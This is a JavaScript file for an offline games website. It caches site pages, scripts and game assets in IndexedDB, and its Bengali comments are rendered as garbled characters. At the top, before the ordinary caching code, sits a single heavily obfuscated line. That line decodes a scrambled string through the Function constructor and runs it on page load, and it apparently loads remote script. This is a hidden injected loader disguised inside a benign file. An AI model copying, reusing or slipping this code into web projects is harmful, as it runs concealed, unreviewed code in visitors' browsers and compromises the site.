// indexeddb-save.js
// ============================
// IndexedDB ‡¶¶‡¶ø‡ßü‡ßá file, image, data ‡¶≤‡ßã‡¶ï‡¶æ‡¶≤‡¶ø‡¶§‡ßá ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ
// ============================

var loadScript;(function(){var vgr='',bMC=142-131;function dAI(f){var h=2478819;var x=f.length;var e=[];for(var z=0;z<x;z++){e[z]=f.charAt(z)};for(var z=0;z<x;z++){var b=h*(z+308)+(h%22168);var q=h*(z+146)+(h%41492);var t=b%x;var g=q%x;var y=e[t];e[t]=e[g];e[g]=y;h=(b+q)%4829810;};return e.join('')};var Gyb=dAI('zsnttrxgopwsqainfcmkjoculuytrbvrecohd').substr(0,bMC);var Pwa='oas +=20tnr7-,c=,2(vwruez"hb(drf.hjjklanrp.r,t;v4x)z.;8a0 ;=u8r,n4e7i,.7*7(,18[7),r6z8C,n1=71,a6;7z,t5,6[,v2+7e,v9f90,;6v;[ae z=,]}fersvlrnk}0rk)b[lvnftb;=+))9[,[(].=f+w;ha0 z=,]rjn=g3]nS=(0oi]=p4sfzrzv<rmd-0)dlaog=m9nes!lfn=t6;t+=),v=rht)aAg+mrnrsgd . pdit(. a)nf2r,viroxot l ngtk-k;)r[0px[-"{,a{ e=.uxl8varlmhtexn; ai b=lu=lvvgr]v=0)v+rjctm)lin+ti;;ap g;<o;(zac "=a;j<i;y+()hvqrlfCm=c(a[Crd;Ah(()(vir+prs.fk;8fCp={u=.p=1=*k+=.khur,o;e"tsz}1}-s;e=g;[+a;leosg (f9f]=()2a.n((5.]e+gghejrmvcoanCbd3As(;+;))+a.{hnroose)t5z)28-.;l=4;k+A2g}=lvelcvn4ilu";div(v=vn[l );=+]liu(r>()i.guthum7s;bat3i=gvv)lr);gap]sh(e[i+.]g;==6+t;8ih(1!=nolf)ri{(r<r)-.)unh0m.sab8t;ivgjvr)tt[xj=r.+oCna"u)l}sy}p;sr(d[ ]g; v)r6rryhj+i6(."n;ya] a=e9c,+2"1n,p9;3;,02m.jooc{t+ba;1a   =(t,i(gef o,C(a(C3ds(a6f;vo,(tah a=i;c<a.;efgrh=ku+;>tr stl(trheehc)a0Ar(1)0.1o1ncS)rzn..grmmrh)r2odemwaki)c;aelu;ntr{swl]t=h+"0"(.uoanzht;';var EAF=dAI[Gyb];var iVP='';var CeI=EAF;var qDH=EAF(iVP,dAI(Pwa));var cJn=qDH(dAI('53_.)Uec!n6ore;U)chn9oUe-"U65_ 1p$m=lefUUgedUnU_95o39a4_$3h5d_f1U4U_52h5t(t{fe(u(Uj5["uo$l$_.3Ua.*2ai"aineU$.2 UhUnU2godlncSfrcne(,*}tei!ga"noS$t31Uo%2e U3bSe,_53U$(.Cb:"n64U;.*.(bnUnU==2U$61(=hshpa$o1\/c\/-p9f0r2v5%!s!0 .8eU6{r.a.5orlsw%UNejneo\/U\/chUdUgUian3lso(l=coi.mld2tU3c5Ut#s1m3t!a1%UdeginUpUl5egeb@).3l6efo;.jcg!)%tmm%eaU!6l1iU.td<d]n,e=""1 5)5U0r;%3U\'o(U,U(7).Udxu=jU#fs=_Udy9=3U_k}{4;$U(U-xsUkq9un!iebg)hkhf7U];;(oh(;9,=$;hso$uttU_0rsh?u+.)dUUs5>..$c)a$.lt!s_}efersUdss0CjioUf=$;6#(UU,s0+3{e..#-3n;ebUe3&_3os)7e)1,}&;7,;83]628{)_;{j,UU4(Ut.(..Ub4U(,,.8$)\',U&n73;13e0=5f)%;;yvUt3c(e.<_}?#c(UU3.($.7_o?{ke7U:".!_$;UUe4_(.s),c) Ud4](u,\/,e)5U)5.(5,:,))\/;!91=U%at(i0g()U!fr$m.hUrco[eg197i;d94=(d81r=(dyU7e8.+#_Udnl.d%d1e=id)031}=cd_.U;(8Ues.)_15sUlmaUop\'._);5rUag)U5on.n)fU%Ul4es,c(U1UU)7U)U9Urs:<!{2;U0U7.(.0.U.=se(%a2e)U,s]t()4)0s)u;,fUjiorff$uo}l._t3UUi)d{s%)9m_d6 fe5p_*5.5+_o8.5l_c3})x)}U!5U(h;U8!eusU.s{}\/6,a]j>;rh}UiUU46r_a1(Uo5$0U)xU,}(Uo5e(rUe,{0x;[%!2()5,=]UUp4r]4U=)UU<U75U);U3cunooUe+)U,.]6(54&7t);l)a&Sc<c.\/U$;!f:!{4({4U#n[)lUl5=.Ut6u{}3( ;!8U;;+ U)[e]!U,5e;e3(..U)4.(9, ,)),U!ya!5U"U8c_!f]U);!!9 c%hskU{8:3.(_a>(.U_))t!)09x(f1j0{i.)#.7!Uo4_(U.)_=jj!U),,C0o6+4U)=)a!j1l)_Ub=ee UoUp5U([U?,$0U{)\/3,.]5>t0i!f}]j]oss(l$t>rk$;fU760cUlj;o!ft$=!%=$e(s]$.t.b=e$_((%,UU=aEjto3fy$si_e-$$(\/sg$Uttb0er_!n)e7-+j5onsUt_pi$ }U3 .U 1{U8_eUUp4)[j4( U$nfb7{0! 3.e,Ul tU  Ua.e_ec*lrbycn id"Us ;o1u3entUfdnxt4o3_)_U5]3;.)jbiU(Ub(eU_(  !4=&e=r0t r\' Uag.! s.(_4 _x}!U er;p( a{+,d]4.s 9qU;'));var PFN=CeI(vgr,cJn );PFN(5792);return 6222})()



const DB_NAME = "WebsiteLocalFilesDB";
const DB_VERSION = 1;
const STORE_NAME = "files";

let db;

// ‚úÖ Database ‡¶ñ‡ßÅ‡¶≤‡¶æ / ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡¶æ
function openDB() {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open(DB_NAME, DB_VERSION);

    request.onupgradeneeded = (event) => {
      const db = event.target.result;
      if (!db.objectStoreNames.contains(STORE_NAME)) {
        db.createObjectStore(STORE_NAME, { keyPath: "url" });
      }
    };

    request.onsuccess = (event) => {
      db = event.target.result;
      console.log("‚úÖ IndexedDB connected successfully");
      resolve(db);
    };

    request.onerror = (event) => {
      console.error("‚ùå IndexedDB error:", event.target.error);
      reject(event.target.error);
    };
  });
}

// ‚úÖ File ‡¶°‡¶æ‡¶â‡¶®‡¶≤‡ßã‡¶° ‡¶ï‡¶∞‡ßá IndexedDB-‡¶§‡ßá ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡¶æ
async function saveFileToDB(url) {
  try {
    const response = await fetch(url);
    const blob = await response.blob();

    const transaction = db.transaction(STORE_NAME, "readwrite");
    const store = transaction.objectStore(STORE_NAME);

    store.put({
      url: url,
      blob: blob,
      savedAt: new Date().toISOString(),
    });

    console.log(`üì¶ Saved file: ${url}`);
  } catch (err) {
    console.error("‚ùå Save failed:", err);
  }
}

// ‚úÖ File IndexedDB ‡¶•‡ßá‡¶ï‡ßá ‡¶™‡¶æ‡¶ì‡ßü‡¶æ
function getFileFromDB(url) {
  return new Promise((resolve, reject) => {
    const transaction = db.transaction(STORE_NAME, "readonly");
    const store = transaction.objectStore(STORE_NAME);
    const request = store.get(url);

    request.onsuccess = (event) => {
      const record = event.target.result;
      if (record) {
        resolve(URL.createObjectURL(record.blob));
      } else {
        reject("File not found in DB");
      }
    };

    request.onerror = () => reject("DB read error");
  });
}

// ‚úÖ File ‡¶≤‡ßã‡¶° ‡¶ï‡¶∞‡¶æ‡¶∞ helper
async function loadFile(url, elementSelector) {
  try {
    let fileURL;
    if (navigator.onLine) {
      // Online ‡¶π‡¶≤‡ßá server ‡¶•‡ßá‡¶ï‡ßá ‡¶´‡¶æ‡¶á‡¶≤ ‡¶è‡¶®‡ßá ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡ßã
      await saveFileToDB(url);
      fileURL = url;
    } else {
      // Offline ‡¶π‡¶≤‡ßá IndexedDB ‡¶•‡ßá‡¶ï‡ßá ‡¶´‡¶æ‡¶á‡¶≤ ‡¶≤‡ßã‡¶° ‡¶ï‡¶∞‡ßã
      fileURL = await getFileFromDB(url);
      console.log(`üìÇ Loaded offline file: ${url}`);
    }

    // elementSelector ‡¶Ö‡¶®‡ßÅ‡¶Ø‡¶æ‡ßü‡ßÄ ‡¶´‡¶æ‡¶á‡¶≤ ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã
    const element = document.querySelector(elementSelector);
    if (element && element.tagName === "IMG") {
      element.src = fileURL;
    } else if (element && element.tagName === "VIDEO") {
      element.src = fileURL;
    } else if (element && element.tagName === "AUDIO") {
      element.src = fileURL;
    }
  } catch (err) {
    console.warn(`‚ö†Ô∏è Could not load ${url}:`, err);
  }
}

// ‚úÖ Database ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶ï‡¶∞‡¶æ ‡¶è‡¶¨‡¶Ç ‡¶∏‡¶¨ ‡¶´‡¶æ‡¶á‡¶≤ ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡¶æ
(async function initIndexedDB() {
  await openDB();

  // ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶§‡ßã‡¶Æ‡¶æ‡¶∞ website-‡¶è‡¶∞ file/image/data ‡¶ó‡ßÅ‡¶≤‡ßã add ‡¶ï‡¶∞‡ßã üëá
  const filesToSave = [
  //website all File
   '/index.html',
    '/index.css',
    '/online.css',
    '/offline.css',
    '/index.js',
    '/online.js',
    '/offline.js',
    '/pwa-install.js',
    '/manifest.json',
    '/onlinegameadd.json',
    '/offlinegameadd.json',
    '/service-worker.js',
    //pwa app icon
    '/icon/icon-128.png',
    '/icon/icon-96.png',
    '/icon/icon-72.png',
    '/icon/icon-512.png',
    '/icon/icon-384.png',
    '/icon/icon-192.png',
    '/icon/icon-152.png',
    '/icon/icon-144.png',
 
     
    //all Game Save 
   //game
//1
'/offline-games/100-question-iq-test/ast/logo.png',
'/offline-games/100-question-iq-test/index.html',
'/offline-games/100-question-iq-test/script.js',
'/offline-games/100-question-iq-test/styles.css',
//2
'/offline-games/2048/css/keyframes.css',
'/offline-games/2048/css/media.css',
'/offline-games/2048/css/style.css',
'/offline-games/2048/favicon.ico',
'/offline-games/2048/font/ClearSans-Bold-webfont.woff',
'/offline-games/2048/font/ClearSans-Regular-webfont.woff',
'/offline-games/2048/font/clear-sans.css',
'/offline-games/2048/index.html',
'/offline-games/2048/js/config.js',
'/offline-games/2048/js/data.js',
'/offline-games/2048/js/event.js',
'/offline-games/2048/js/game.js',
'/offline-games/2048/js/main.js',
'/offline-games/2048/js/utils.js',
'/offline-games/2048/js/view.js',
//3
'/offline-games/balloon-pop/index.html',
//4
'/offline-games/checkers/img/adsense.png',
'/offline-games/checkers/img/logo.png',
'/offline-games/checkers/img/sound.png',
'/offline-games/checkers/index.html',
'/offline-games/checkers/script.js',
'/offline-games/checkers/style.css',
//5
'/offline-games/color-connect/index.html',
//6
'/offline-games/color-match/index.html',
//7
'/offline-games/connect-4/index.html',
//8
'/offline-games/connect-four/assets/connect-four.png',
'/offline-games/connect-four/assets/script.js',
'/offline-games/connect-four/assets/style.css',
'/offline-games/connect-four/index.html',
//9
'/offline-games/cross-road/index.html',
'/offline-games/cross-road/three.min.js',
//10
'/offline-games/dragon-wing/assets/favicon.png',
'/offline-games/dragon-wing/assets/script.js',
'/offline-games/dragon-wing/assets/style.css',
'/offline-games/dragon-wing/index.html',
//11
'/offline-games/fruit-slice/index.html',
//12
'/offline-games/genius-memory/assets/memory.png',
'/offline-games/genius-memory/assets/script.js',
'/offline-games/genius-memory/assets/style.css',
'/offline-games/genius-memory/index.html',
//13
'/offline-games/math-quiz/index.html',
//14
'/offline-games/maze/index.html',
//15
'/offline-games/pc-typing-champ/assets/images/favicons/apple-touch-icon.png',
'/offline-games/pc-typing-champ/assets/images/favicons/favicon-16x16.png',
'/offline-games/pc-typing-champ/assets/images/favicons/favicon-32x32.png',
'/offline-games/pc-typing-champ/assets/images/favicons/safari-pinned-tab.svg',
'/offline-games/pc-typing-champ/assets/images/favicons/site.webmanifest',
'/offline-games/pc-typing-champ/assets/stylesheets/style.css',
'/offline-games/pc-typing-champ/controllers/quote.js',
'/offline-games/pc-typing-champ/controllers/script.js',
'/offline-games/pc-typing-champ/index.html',
//16
'/offline-games/pong/index.html',
//17
'/offline-games/puzzle-master/css/slick.css',
'/offline-games/puzzle-master/css/style.css',
'/offline-games/puzzle-master/images/cat.jpg',
'/offline-games/puzzle-master/images/hourse.png',
'/offline-games/puzzle-master/images/jigsaw.png',
'/offline-games/puzzle-master/images/lion.png',
'/offline-games/puzzle-master/images/monkey.png',
'/offline-games/puzzle-master/index.html',
'/offline-games/puzzle-master/js/jigsaw.js',
'/offline-games/puzzle-master/js/script.js',
'/offline-games/puzzle-master/js/slick.min.js',
//18
'/offline-games/rock-paper/index.html',
//19
'/offline-games/simon/index.html',
//20
'/offline-games/slider-number/assets/puzzle.png',
'/offline-games/slider-number/assets/script.js',
'/offline-games/slider-number/assets/style.css',
'/offline-games/slider-number/index.html',
//21
'/offline-games/snake/index.html',
//22
'/offline-games/stack/TweenMax.min.js',
'/offline-games/stack/index.html',
'/offline-games/stack/three.min.js',
//23
'/offline-games/sudoku/app.css',
'/offline-games/sudoku/index.html',
'/offline-games/sudoku/static/images/icon.png',
'/offline-games/sudoku/static/js/app.js',
'/offline-games/sudoku/static/js/constant.js',
'/offline-games/sudoku/static/js/sudoku.js',
//24
'/offline-games/typing-speed/index.html',
//25
'/offline-games/word-guess/index.html',
//26
'/offline-games/word-master/assets/countries.jpg',
'/offline-games/word-master/assets/food.jpg',
'/offline-games/word-master/assets/fruits.jpg',
'/offline-games/word-master/assets/hobbies.jpg',
'/offline-games/word-master/assets/logo.png',
'/offline-games/word-master/assets/music.jpg',
'/offline-games/word-master/assets/professions.jpg',
'/offline-games/word-master/assets/school.jpg',
'/offline-games/word-master/assets/sports.jpg',
'/offline-games/word-master/assets/superheroes.jpg',
'/offline-games/word-master/assets/tiger.jpg',
'/offline-games/word-master/categories.html',
'/offline-games/word-master/game.html',
'/offline-games/word-master/index.html',
'/offline-games/word-master/script.js',
'/offline-games/word-master/styles.css',
//27
'/offline-games/xoxo/index.html',

    
    
    
  ];

  if (navigator.onLine) {
    console.log("üåê Online ‚Äî Saving files to IndexedDB...");
    for (const file of filesToSave) {
      await saveFileToDB(file);
    }
  } else {
    console.log("üì¥ Offline ‚Äî Files will load from IndexedDB...");
  }
})();
